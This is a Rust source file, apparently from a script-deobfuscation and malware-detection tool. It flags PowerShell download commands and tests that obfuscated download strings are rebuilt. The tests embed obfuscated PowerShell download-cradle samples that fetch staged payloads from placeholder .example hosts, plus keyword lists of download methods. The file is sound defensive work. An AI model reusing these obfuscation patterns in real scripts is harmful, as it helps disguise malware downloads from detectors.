fn contains_ascii_case_insensitive_bytes(text: &str, atom: &[u8]) -> bool {
    !atom.is_empty()
        && text.as_bytes().windows(atom.len()).any(|window| {
            window
                .iter()
                .zip(atom)
                .all(|(byte, atom_byte)| byte.eq_ignore_ascii_case(atom_byte))
        })
}

fn ps_url_inside_non_download_hash_option(text: &str, url_start: usize) -> bool {
    let stmt_start = text[..url_start]
        .rfind(['\r', '\n', ';'])
        .map_or(0, |idx| idx + 1);
    let before_url = &text[stmt_start..url_start];
    let lower = before_url.to_ascii_lowercase();
    for option in ["-headers", "-body"] {
        let Some(option_pos) = rfind_ps_option_token(&lower, option) else {
            continue;
        };
        let after_option = &before_url[option_pos..];
        let Some(hash_rel) = after_option.rfind("@{") else {
            continue;
        };
        let hash_start = stmt_start + option_pos + hash_rel;
        if !text[hash_start..url_start].contains('}') {
            return true;
        }
    }
    false
}

fn rfind_ps_option_token(lower: &str, option: &str) -> Option<usize> {
    let mut search_end = lower.len();
    while let Some(pos) = lower[..search_end].rfind('-') {
        let before_boundary = pos == 0
            || lower.as_bytes()[pos - 1].is_ascii_whitespace()
            || matches!(lower.as_bytes()[pos - 1], b'(' | b';');
        let after = lower[pos..]
            .find(|c: char| !c.is_ascii_alphanumeric() && c != '-')
            .map_or(lower.len(), |rel| pos + rel);
        let after_boundary = after == lower.len()
            || lower.as_bytes()[after].is_ascii_whitespace()
            || matches!(lower.as_bytes()[after], b':' | b'=');
        if before_boundary && after_boundary && ps_option_token_matches(&lower[pos..after], option)
        {
            return Some(pos);
        }
        search_end = pos;
    }
    None
}

fn ps_option_token_matches(token: &str, option: &str) -> bool {
    let token = token.trim_start_matches('-');
    let option = option.trim_start_matches('-');
    let min_len = match option {
        "headers" | "body" => 2,
        "useragent" => 5,
        "proxylist" => 6,
        _ => option.len(),
    };
    token.len() >= min_len && token.len() <= option.len() && option.starts_with(token)
}

fn ps_url_is_non_download_option_value(text: &str, url_start: usize) -> bool {
    let stmt_start = text[..url_start]
        .rfind(['\r', '\n', ';'])
        .map_or(0, |idx| idx + 1);
    let before_url = &text[stmt_start..url_start];
    ps_non_download_option_before_value(
        before_url.trim_end_matches([' ', '\t', '\r', '\n', '"', '\'', '(', '=', ':']),
    ) || ps_quoted_non_download_option_before_value(before_url)
}

fn ps_url_is_path_filename_argument(text: &str, url_start: usize) -> bool {
    let statement = logical_statement_at(text, url_start).to_ascii_lowercase();
    statement.contains("::getfilename(")
        || statement.contains("::getfilenamewithoutextension(")
        || statement.contains("::getextension(")
}

fn ps_quoted_non_download_option_before_value(before_url: &str) -> bool {
    let Some((quote_pos, _)) = before_url
        .char_indices()
        .rev()
        .find(|(_, ch)| *ch == '"' || *ch == '\'')
    else {
        return false;
    };
    ps_non_download_option_before_value(before_url[..quote_pos].trim_end())
}

fn ps_non_download_option_before_value(before_value: &str) -> bool {
    let Some(option) = before_value.split_whitespace().last() else {
        return false;
    };
    let option = option.trim_end_matches(['=', ':']);
    ps_option_token_matches(&option.to_ascii_lowercase(), "-body")
        || option.eq_ignore_ascii_case("-proxy")
        || ps_option_token_matches(&option.to_ascii_lowercase(), "-proxylist")
        || ps_option_token_matches(&option.to_ascii_lowercase(), "-useragent")
}

fn clean_ps_url(raw: &str) -> String {
    let mut url = raw.trim().trim_matches(['"', '\'']).to_string();
    for marker in ['[', '{'] {
        if let Some(pos) = url.find(marker) {
            url.truncate(pos);
        }
    }
    while let Some(last) = url.chars().last() {
        if matches!(
            last,
            '.' | ',' | ';' | ':' | ')' | ']' | '}' | '"' | '\'' | '`' | '&'
        ) {
            url.pop();
        } else {
            break;
        }
    }
    url
}

fn is_schemeless_ip_url(url: &str) -> bool {
    let Some(host) = url.split([':', '/']).next() else {
        return false;
    };
    let mut parts = host.split('.');
    let octets = [
        parts.next(),
        parts.next(),
        parts.next(),
        parts.next(),
        parts.next(),
    ];
    if octets[4].is_some() {
        return false;
    }
    octets[..4]
        .iter()
        .all(|part| part.and_then(|p| p.parse::<u8>().ok()).is_some())
}

pub fn scan_inline_powershell_text(text: &str, env: &mut Environment) {
    if !inline_powershell_text_has_payload_signal(text) {
        return;
    }
    let scan_text = inline_powershell_scan_text(text);
    let scan_text = inline_powershell_executable_scan_text(scan_text.as_ref());
    if scan_text.trim().is_empty() {
        return;
    }
    let known_downloads: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            _ => None,
        })
        .collect();
    let mut payload_env = Environment::new(&crate::env::Config {
        max_depth: env.limits.max_depth,
        max_iterations: env.limits.max_iterations,
        max_child_scripts: env.limits.max_child_scripts,
        timeout_secs: 0,
        self_extract: false,
        winver: env.winver,
        max_output_bytes: env.limits.max_output_bytes,
        max_output_line_bytes: env.limits.max_output_line_bytes,
        max_traits_per_kind: 100,
    });
    payload_env.ps1_scan_cache_normalized = false;
    payload_env
        .all_extracted_ps1
        .push(scan_text.as_bytes().to_vec());
    scan_ps1_payloads(&mut payload_env);
    let mut new_traits = Vec::new();
    let mut decoded_downloads = Vec::new();
    for t in payload_env.traits {
        if let Trait::Download { src, .. } = &t {
            decoded_downloads.push(src.clone());
            if known_downloads.contains(src) {
                continue;
            }
        }
        new_traits.push(t);
    }
    for t in &new_traits {
        if let Trait::Download { src, .. } = t {
            if !decoded_downloads.iter().any(|known| known == src) {
                decoded_downloads.push(src.clone());
            }
        }
    }
    if !decoded_downloads.is_empty() {
        let normalized = normalize_ps1_text(scan_text.as_ref());
        if decoded_downloads
            .iter()
            .any(|src| normalized.contains(src) && !scan_text.as_ref().contains(src))
        {
            let normalized_bytes = normalized.into_bytes();
            if !env
                .all_extracted_ps1
                .iter()
                .any(|payload| payload.as_slice() == normalized_bytes.as_slice())
            {
                env.all_extracted_ps1.push(normalized_bytes);
            }
        }
    }
    env.traits.extend(new_traits);
}

fn inline_powershell_executable_scan_text(text: &str) -> std::borrow::Cow<'_, str> {
    if !text.lines().any(inline_powershell_line_is_echo_text) {
        return std::borrow::Cow::Borrowed(text);
    }

    let mut candidate = String::new();
    for line in text.lines() {
        if inline_powershell_line_is_echo_text(line) {
            continue;
        }
        if !candidate.is_empty() {
            candidate.push('\n');
        }
        candidate.push_str(line);
    }

    std::borrow::Cow::Owned(candidate)
}

fn inline_powershell_line_is_echo_text(line: &str) -> bool {
    let trimmed = line.trim_start_matches(|ch: char| ch.is_ascii_whitespace() || ch == '@');
    let Some(first) = crate::handlers::util::split_words(trimmed).first().cloned() else {
        return false;
    };
    let token = first.to_ascii_lowercase();
    token == "echo" || token.starts_with("echo.") || token.starts_with("echo:") || token == "echo("
}

fn inline_powershell_scan_text(text: &str) -> std::borrow::Cow<'_, str> {
    const LARGE_TEXT_CANDIDATE_THRESHOLD: usize = 512 * 1024;
    if inline_powershell_text_looks_like_batch(text) {
        if let Some(candidate) = inline_powershell_launch_candidate_text(text) {
            return std::borrow::Cow::Owned(candidate);
        }
    }

    if text.len() < LARGE_TEXT_CANDIDATE_THRESHOLD {
        return std::borrow::Cow::Borrowed(text);
    }

    if inline_powershell_text_needs_global_context(text) {
        return std::borrow::Cow::Borrowed(text);
    }

    if let Some(candidate) = inline_powershell_launch_candidate_text(text) {
        std::borrow::Cow::Owned(candidate)
    } else {
        std::borrow::Cow::Borrowed(text)
    }
}

fn inline_powershell_launch_candidate_text(text: &str) -> Option<String> {
    let mut candidate = String::new();
    for line in text.lines() {
        if inline_powershell_launch_line_has_payload_signal(line) {
            if !candidate.is_empty() {
                candidate.push('\n');
            }
            candidate.push_str(line);
        }
    }
    if candidate.is_empty() {
        None
    } else {
        Some(candidate)
    }
}

fn inline_powershell_text_needs_global_context(text: &str) -> bool {
    contains_ascii_case_insensitive_bytes(text, b"downloadstring")
        || contains_ascii_case_insensitive_bytes(text, b"downloadfile")
        || contains_ascii_case_insensitive_bytes(text, b"downloaddata")
        || contains_ascii_case_insensitive_bytes(text, b"callbyname")
}

fn inline_powershell_text_looks_like_batch(text: &str) -> bool {
    text.lines().take(64).any(|line| {
        let line = line.trim_start();
        line.eq_ignore_ascii_case("@echo off")
            || line.eq_ignore_ascii_case("echo off")
            || line.to_ascii_lowercase().starts_with("setlocal")
            || line.to_ascii_lowercase().starts_with("set ")
            || line.to_ascii_lowercase().starts_with("start ")
    })
}

fn inline_powershell_text_has_payload_signal(text: &str) -> bool {
    if inline_powershell_text_needs_global_context(text) {
        return true;
    }

    let has_url_atom = contains_ascii_case_insensitive_bytes(text, b"http://")
        || contains_ascii_case_insensitive_bytes(text, b"https://")
        || contains_ascii_case_insensitive_bytes(text, b"ftp://");
    if has_url_atom
        && (contains_ascii_case_insensitive_bytes(text, b"invoke-webrequest")
            || contains_ascii_case_insensitive_bytes(text, b"invoke-restmethod")
            || contains_ascii_case_insensitive_bytes(text, b"start-bitstransfer")
            || contains_ascii_case_insensitive_bytes(text, b"iwr ")
            || contains_ascii_case_insensitive_bytes(text, b"irm "))
    {
        return true;
    }

    text.lines()
        .any(inline_powershell_launch_line_has_payload_signal)
}

fn inline_powershell_launch_line_has_payload_signal(line: &str) -> bool {
    (contains_ascii_case_insensitive_bytes(line, b"powershell")
        || contains_ascii_case_insensitive_bytes(line, b"pwsh"))
        && (line_has_powershell_payload_flag(line)
            || contains_ascii_case_insensitive_bytes(line, b"http://")
            || contains_ascii_case_insensitive_bytes(line, b"https://")
            || contains_ascii_case_insensitive_bytes(line, b"iex "))
}

fn line_has_powershell_payload_flag(line: &str) -> bool {
    line.split_whitespace().any(|token| {
        let token = token.trim_matches(['"', '\'', '`', ',', ';', ')', '(']);
        matches!(
            crate::handlers::powershell::canonical_ps_flag(token),
            Some("EncodedCommand" | "Command")
        )
    })
}

#[cfg(test)]
mod literal_substring_extractor_tests {
    use super::{
        expand_doubled_quote_literals, expand_literal_concat_extractor_calls,
        expand_literal_index_extractor_calls, expand_literal_insert_extractor_calls,
        expand_literal_remove_extractor_calls, expand_literal_replace_extractor_calls,
        expand_literal_split_index_extractor_calls, expand_literal_string_case_extractor_calls,
        expand_literal_substring_extractor_calls, expand_literal_trim_extractor_calls,
        expand_parenthesized_string_concat, literal_substring_extractor_defs,
        PS_LITERAL_INDEX_EXTRACTOR_BODY_RE, PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE,
    };
    use crate::env::{Config, Environment};
    use crate::traits::Trait;

    #[test]
    fn doubled_quote_expansion_preserves_empty_single_quoted_argument() {
        let text = "Clean 'abc' '~' ''";

        let out = expand_doubled_quote_literals(text);

        assert_eq!(out, text);
    }

    #[test]
    fn space_concat_does_not_merge_function_call_arguments() {
        let text = "Clean 'abc' '~' ''";

        let out = super::expand_space_concat(text);

        assert_eq!(out, text);
    }

    #[test]
    fn parenthesized_single_quote_concat_is_rewritten() {
        let text = "$cmd = ('Inv') + ('oke') + ('-WebRequest')";

        let out = expand_parenthesized_string_concat(text);

        assert_eq!(out, "$cmd = 'Invoke-WebRequest'");
    }

    #[test]
    fn literal_substring_extractor_call_is_rewritten() {
        let text = r#"function Pick($value,$start,$count) {
  return $value.Substring($start,$count)
}
        Pick 'zzInvoke-WebRequest -Uri https://ps-extractor-call.example/stage.ps1yy' 2 66"#;

        let defs = literal_substring_extractor_defs(text);
        assert_eq!(defs.len(), 1, "unexpected parsed definitions: {defs:?}");
        assert!(
            PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE.is_match(&defs[0].2),
            "substring extractor body was not recognized:\n{}",
            defs[0].2
        );
        let out = expand_literal_substring_extractor_calls(text);

        assert!(
            out.contains("'Invoke-WebRequest -Uri https://ps-extractor-call.example/stage.ps1'"),
            "substring extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_substring_extractor_variable_url_is_scanned_as_download() {
        let script = br#"function Pick($value,$start) {
  return $value.Substring($start)
}
$url = Pick "zzhttps://ps-extractor-var-url.example/stage.ps1" 2
iwr $url"#;
        let mut env = Environment::new(&Config::default());
        env.all_extracted_ps1.push(script.to_vec());

        super::scan_ps1_payloads(&mut env);

        assert!(
            env.traits.iter().any(|t| matches!(
                t,
                Trait::Download { src, .. }
                    if src == "https://ps-extractor-var-url.example/stage.ps1"
            )),
            "PS extractor-assigned URL was not surfaced as a download: {:?}",
            env.traits
        );
    }

    #[test]
    fn webrequest_filestream_download_destination_is_extracted() {
        let script = br#"
$request = [System.Net.WebRequest]::Create('https://ps-webrequest-filestream.example/stage.rar')
$response = $request.GetResponse()
$responseStream = $response.GetResponseStream()
$fileStream = New-Object System.IO.FileStream('C:\Users\puncher\AppData\Local\Temp\stage.rar', [System.IO.FileMode]::Create)
[byte[]]$buffer = New-Object byte[] 1024
while(($bytesRead = $responseStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
    $fileStream.Write($buffer, 0, $bytesRead)
}
"#;
        let mut env = Environment::new(&Config::default());
        env.all_extracted_ps1.push(script.to_vec());

        super::scan_ps1_payloads(&mut env);

        assert!(
            env.traits.iter().any(|t| matches!(
                t,
                Trait::Download {
                    src,
                    dst: Some(dst),
                    ..
                } if src == "https://ps-webrequest-filestream.example/stage.rar"
                    && dst == "C:\\Users\\puncher\\AppData\\Local\\Temp\\stage.rar"
            )),
            "WebRequest/FileStream destination was not surfaced: {:?}",
            env.traits
        );
    }

    #[test]
    fn literal_remove_extractor_double_quoted_variable_url_is_scanned_as_download() {
        let script = br#"function Cut($value,$start,$count) {
  return $value.Remove($start,$count)
}
$url = Cut "JUNKhttps://ps-remove-var-url.example/stage.ps1" 0 4
iwr $url"#;
        let mut env = Environment::new(&Config::default());
        env.all_extracted_ps1.push(script.to_vec());

        super::scan_ps1_payloads(&mut env);

        assert!(
            env.traits.iter().any(|t| matches!(
                t,
                Trait::Download { src, .. }
                    if src == "https://ps-remove-var-url.example/stage.ps1"
            )),
            "PS remove-extractor URL was not surfaced as a download: {:?}",
            env.traits
        );
    }

    #[test]
    fn literal_concat_extractor_double_quoted_variable_url_is_scanned_as_download() {
        let script = br#"function Join-Text($left,$right) {
  return $left + $right
}
$url = Join-Text "https://ps-concat-var-url.example" "/stage.ps1"
iwr $url"#;
        let mut env = Environment::new(&Config::default());
        env.all_extracted_ps1.push(script.to_vec());

        super::scan_ps1_payloads(&mut env);

        assert!(
            env.traits.iter().any(|t| matches!(
                t,
                Trait::Download { src, .. }
                    if src == "https://ps-concat-var-url.example/stage.ps1"
            )),
            "PS concat-extractor URL was not surfaced as a download: {:?}",
            env.traits
        );
    }

    #[test]
    fn literal_index_extractor_mixed_concat_url_is_scanned_as_download() {
        let script = br#"function Pick($value,$index) {
  return $value[$index]
}
$url = (Pick "hx" 0) + "ttps://ps-index-mixed-concat.example/stage.ps1"
iwr $url"#;
        let mut env = Environment::new(&Config::default());
        env.all_extracted_ps1.push(script.to_vec());

        super::scan_ps1_payloads(&mut env);

        assert!(
            env.traits.iter().any(|t| matches!(
                t,
                Trait::Download { src, .. }
                    if src == "https://ps-index-mixed-concat.example/stage.ps1"
            )),
            "PS index-extractor mixed concat URL was not surfaced as a download: {:?}",
            env.traits
        );
    }

    #[test]
    fn literal_substring_extractor_reordered_call_is_rewritten() {
        let decoded =
            "Invoke-WebRequest -Uri https://ps-reordered-substring-extractor.example/stage.ps1";
        let text = format!(
            r#"function Pick($unused,$value,$start,$count) {{
  return $value.Substring($start,$count)
}}
        Pick 0 'zz{decoded}yy' 2 {}"#,
            decoded.len()
        );

        let out = expand_literal_substring_extractor_calls(&text);

        assert!(
            out.contains(&format!("'{decoded}'")),
            "reordered substring extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_constant_substring_extractor_call_is_rewritten() {
        let decoded =
            "Invoke-WebRequest -Uri https://ps-const-substring-extractor.example/stage.ps1";
        let text = format!(
            r#"function Pick($value) {{
  return $value.Substring(2,{len})
}}
Pick 'zz{decoded}yy'"#,
            len = decoded.len()
        );

        let out = expand_literal_substring_extractor_calls(&text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-const-substring-extractor.example/stage.ps1'"
            ),
            "constant substring extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_constant_substring_extractor_reordered_call_is_rewritten() {
        let decoded =
            "Invoke-WebRequest -Uri https://ps-reordered-const-substring.example/stage.ps1";
        let text = format!(
            r#"function Pick($unused,$value) {{
  return $value.Substring(2,{len})
}}
Pick 0 'zz{decoded}yy'"#,
            len = decoded.len()
        );

        let out = expand_literal_substring_extractor_calls(&text);

        assert!(
            out.contains(&format!("'{decoded}'")),
            "reordered constant substring extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_hyphenated_function_name_substring_extractor_call_is_rewritten() {
        let decoded =
            "Invoke-WebRequest -Uri https://ps-hyphen-function-extractor.example/stage.ps1";
        let text = format!(
            r#"function Get-Text($value,$start,$count) {{
  return $value.Substring($start,$count)
}}
Get-Text 'zz{decoded}yy' 2 {len}"#,
            len = decoded.len()
        );

        let out = expand_literal_substring_extractor_calls(&text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-hyphen-function-extractor.example/stage.ps1'"
            ),
            "hyphenated-function substring extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_scoped_function_name_substring_extractor_call_is_rewritten() {
        let decoded =
            "Invoke-WebRequest -Uri https://ps-scoped-function-extractor.example/stage.ps1";
        let text = format!(
            r#"function script:Get-Text($value,$start,$count) {{
  return $value.Substring($start,$count)
}}
Get-Text 'zz{decoded}yy' 2 {len}"#,
            len = decoded.len()
        );

        let out = expand_literal_substring_extractor_calls(&text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-scoped-function-extractor.example/stage.ps1'"
            ),
            "scoped-function substring extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_substring_extractor_named_args_call_is_rewritten() {
        let decoded =
            "Invoke-WebRequest -Uri https://ps-substring-named-args-extractor.example/stage.ps1";
        let text = format!(
            r#"function Pick($value,$start,$count) {{
  return $value.Substring($start,$count)
}}
Pick -count {len} -value 'xxx{decoded}yyy' -start 3"#,
            len = decoded.len()
        );

        let out = expand_literal_substring_extractor_calls(&text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-substring-named-args-extractor.example/stage.ps1'"
            ),
            "named-argument substring extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_parenthesized_receiver_substring_extractor_call_is_rewritten() {
        let decoded =
            "Invoke-WebRequest -Uri https://ps-paren-substring-extractor.example/stage.ps1";
        let text = format!(
            r#"function Pick($value,$start,$count) {{
  return ($value).Substring($start,$count)
}}
Pick 'zz{decoded}yy' 2 {len}"#,
            len = decoded.len()
        );

        let out = expand_literal_substring_extractor_calls(&text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-paren-substring-extractor.example/stage.ps1'"
            ),
            "parenthesized-receiver substring extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_tail_substring_extractor_call_is_rewritten() {
        let decoded =
            "Invoke-WebRequest -Uri https://ps-tail-substring-extractor.example/stage.ps1";
        let text = format!(
            r#"function Tail($value,$start) {{
  return $value.Substring($start)
}}
Tail 'zz{decoded}' 2"#
        );

        let out = expand_literal_substring_extractor_calls(&text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-tail-substring-extractor.example/stage.ps1'"
            ),
            "tail substring extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_remove_extractor_call_is_rewritten() {
        let decoded = "Invoke-WebRequest -Uri https://ps-remove-extractor.example/stage.ps1";
        let text = r#"function Cut($value,$start,$count) {
  return $value.Remove($start,$count)
}
Cut 'Invoke-JUNKWebRequest -Uri https://ps-remove-extractor.example/stage.ps1' 7 4"#;

        let out = expand_literal_remove_extractor_calls(text);

        assert!(
            out.contains(&format!("'{decoded}'")),
            "literal remove extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_remove_extractor_reordered_call_is_rewritten() {
        let decoded =
            "Invoke-WebRequest -Uri https://ps-reordered-remove-extractor.example/stage.ps1";
        let text = r#"function Cut($unused,$value,$start,$count) {
  return $value.Remove($start,$count)
}
Cut 0 'Invoke-JUNKWebRequest -Uri https://ps-reordered-remove-extractor.example/stage.ps1' 7 4"#;

        let out = expand_literal_remove_extractor_calls(text);

        assert!(
            out.contains(&format!("'{decoded}'")),
            "literal reordered remove extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_constant_remove_extractor_call_is_rewritten() {
        let decoded = "Invoke-WebRequest -Uri https://ps-const-remove-extractor.example/stage.ps1";
        let text = format!(
            r#"function Cut($value) {{
  return $value.Remove(0,2)
}}
Cut 'xx{decoded}'"#
        );

        let out = expand_literal_remove_extractor_calls(&text);

        assert!(
            out.contains(&format!("'{decoded}'")),
            "literal constant remove extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_tail_remove_extractor_call_is_rewritten() {
        let decoded = "Invoke-WebRequest -Uri https://ps-tail-remove-extractor.example/stage.ps1";
        let start = decoded.len();
        let text = format!(
            r#"function CutTail($value,$start) {{
  return $value.Remove($start)
}}
CutTail '{decoded}JUNK' {start}"#
        );

        let out = expand_literal_remove_extractor_calls(&text);

        assert!(
            out.contains(&format!("'{decoded}'")),
            "literal tail remove extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_insert_extractor_call_is_rewritten() {
        let decoded = "Invoke-WebRequest -Uri https://ps-insert-extractor.example/stage.ps1";
        let text = r#"function Add($value,$start,$text) {
  return $value.Insert($start,$text)
}
Add 'InvokeWebRequest -Uri https://ps-insert-extractor.example/stage.ps1' 6 '-'"#;

        let out = expand_literal_insert_extractor_calls(text);

        assert!(
            out.contains(&format!("'{decoded}'")),
            "literal insert extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_insert_extractor_reordered_call_is_rewritten() {
        let decoded =
            "Invoke-WebRequest -Uri https://ps-reordered-insert-extractor.example/stage.ps1";
        let text = r#"function Add($unused,$value,$start,$text) {
  return $value.Insert($start,$text)
}
Add 0 'InvokeWebRequest -Uri https://ps-reordered-insert-extractor.example/stage.ps1' 6 '-'"#;

        let out = expand_literal_insert_extractor_calls(text);

        assert!(
            out.contains(&format!("'{decoded}'")),
            "literal reordered insert extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_constant_insert_extractor_call_is_rewritten() {
        let decoded = "Invoke-WebRequest -Uri https://ps-const-insert-extractor.example/stage.ps1";
        let text = r#"function Add($value) {
  return $value.Insert(6,'-')
}
Add 'InvokeWebRequest -Uri https://ps-const-insert-extractor.example/stage.ps1'"#;

        let out = expand_literal_insert_extractor_calls(text);

        assert!(
            out.contains(&format!("'{decoded}'")),
            "literal constant insert extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_string_case_extractor_call_is_rewritten() {
        let text = r#"function Lower($value) {
  return $value.ToLower()
}
Lower 'INVOKE-WEBREQUEST -URI HTTPS://PS-LOWER-EXTRACTOR.EXAMPLE/STAGE.PS1'"#;

        let out = expand_literal_string_case_extractor_calls(text);

        assert!(
            out.contains("'invoke-webrequest -uri https://ps-lower-extractor.example/stage.ps1'"),
            "literal string-case extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_string_case_extractor_reordered_call_is_rewritten() {
        let text = r#"function Lower($unused,$value) {
  return $value.ToLower()
}
Lower 0 'INVOKE-WEBREQUEST -URI HTTPS://PS-REORDERED-LOWER-EXTRACTOR.EXAMPLE/STAGE.PS1'"#;

        let out = expand_literal_string_case_extractor_calls(text);

        assert!(
            out.contains(
                "'invoke-webrequest -uri https://ps-reordered-lower-extractor.example/stage.ps1'"
            ),
            "reordered literal string-case extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_concat_extractor_named_args_call_is_rewritten() {
        let text = r#"function Join-Text($left,$right) {
  return $left + $right
}
Join-Text -right '.example/stage.ps1' -left 'Invoke-WebRequest -Uri https://ps-concat-named-extractor'"#;

        let out = expand_literal_concat_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-concat-named-extractor.example/stage.ps1'"
            ),
            "named-argument concat extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_multi_concat_extractor_named_args_call_is_rewritten() {
        let text = r#"function Join-Text($left,$middle,$right) {
  return $left + $middle + $right
}
Join-Text -right '.example/stage.ps1' -left 'Invoke-WebRequest -Uri https://ps-multi-concat-named' -middle '-extractor'"#;

        let out = expand_literal_concat_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-multi-concat-named-extractor.example/stage.ps1'"
            ),
            "named-argument multi-concat extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_string_concat_extractor_named_args_call_is_rewritten() {
        let text = r#"function Join-Text($left,$middle,$right) {
  return [System.String]::Concat($left,$middle,$right)
}
Join-Text -right '.example/stage.ps1' -left 'Invoke-WebRequest -Uri https://ps-string-concat-named' -middle '-extractor'"#;

        let out = expand_literal_concat_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-string-concat-named-extractor.example/stage.ps1'"
            ),
            "named-argument [string]::Concat extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_string_concat_array_extractor_named_args_call_is_rewritten() {
        let text = r#"function Join-Text($left,$middle,$right) {
  return [System.String]::Concat(@($left,$middle,$right))
}
Join-Text -right '.example/stage.ps1' -left 'Invoke-WebRequest -Uri https://ps-string-concat-array-named' -middle '-extractor'"#;

        let out = expand_literal_concat_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-string-concat-array-named-extractor.example/stage.ps1'"
            ),
            "named-argument [string]::Concat array extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_string_join_extractor_named_args_call_is_rewritten() {
        let text = r#"function Join-Text($left,$middle,$right) {
  return [System.String]::Join('', @($left,$middle,$right))
}
Join-Text -right '.example/stage.ps1' -left 'Invoke-WebRequest -Uri https://ps-string-join-named' -middle '-extractor'"#;

        let out = expand_literal_concat_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-string-join-named-extractor.example/stage.ps1'"
            ),
            "named-argument [string]::Join extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_format_extractor_named_args_call_is_rewritten() {
        let text = r#"function Format-Text($left,$middle,$right) {
  return '{0}{1}{2}' -f $left,$middle,$right
}
Format-Text -right '.example/stage.ps1' -left 'Invoke-WebRequest -Uri https://ps-format-named' -middle '-extractor'"#;

        let out = expand_literal_concat_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-format-named-extractor.example/stage.ps1'"
            ),
            "named-argument format extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_array_format_extractor_named_args_call_is_rewritten() {
        let text = r#"function Format-Text($left,$middle,$right) {
  return '{0}{1}{2}' -f @($left,$middle,$right)
}
Format-Text -right '.example/stage.ps1' -left 'Invoke-WebRequest -Uri https://ps-array-format-named' -middle '-extractor'"#;

        let out = expand_literal_concat_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-array-format-named-extractor.example/stage.ps1'"
            ),
            "named-argument array format extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_string_format_extractor_named_args_call_is_rewritten() {
        let text = r#"function Format-Text($left,$middle,$right) {
  return [System.String]::Format('{0}{1}{2}', $left,$middle,$right)
}
Format-Text -right '.example/stage.ps1' -left 'Invoke-WebRequest -Uri https://ps-string-format-named' -middle '-extractor'"#;

        let out = expand_literal_concat_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-string-format-named-extractor.example/stage.ps1'"
            ),
            "named-argument [string]::Format extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_index_extractor_call_is_rewritten() {
        let text = r#"function Pick($value,$index) {
  return $value[$index]
}
Pick 'xI' 1"#;

        let defs = literal_substring_extractor_defs(text);
        assert_eq!(defs.len(), 1, "unexpected parsed definitions: {defs:?}");
        assert!(
            PS_LITERAL_INDEX_EXTRACTOR_BODY_RE.is_match(&defs[0].2),
            "index extractor body was not recognized:\n{}",
            defs[0].2
        );
        let out = expand_literal_index_extractor_calls(text);

        assert!(
            out.contains("'I'"),
            "index extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_index_extractor_call_with_dummy_arg_is_rewritten() {
        let text = r#"function Pick($unused,$value,$index) {
  return $value[$index]
}
Pick 0 'xI' 1"#;

        let out = expand_literal_index_extractor_calls(text);

        assert!(
            out.contains("'I'"),
            "index extractor call with dummy arg was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_replace_extractor_call_is_rewritten() {
        let text = r#"function Clean($value,$needle,$replacement) {
  return $value -replace $needle,$replacement
}
Clean 'I~n~v~o~k~e~-~W~e~b~R~e~q~u~e~s~t~ ~-~U~r~i~ ~h~t~t~p~s~:~/~/~p~s~-~r~e~p~l~a~c~e~-~e~x~t~r~a~c~t~o~r~.~e~x~a~m~p~l~e~/~s~t~a~g~e~.~p~s~1' '~' ''"#;

        let out = expand_literal_replace_extractor_calls(text);

        assert!(
            out.contains("'Invoke-WebRequest -Uri https://ps-replace-extractor.example/stage.ps1'"),
            "replace extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_replace_extractor_reordered_call_is_rewritten() {
        let text = r#"function Clean($unused,$value,$needle,$replacement) {
  return $value -replace $needle,$replacement
}
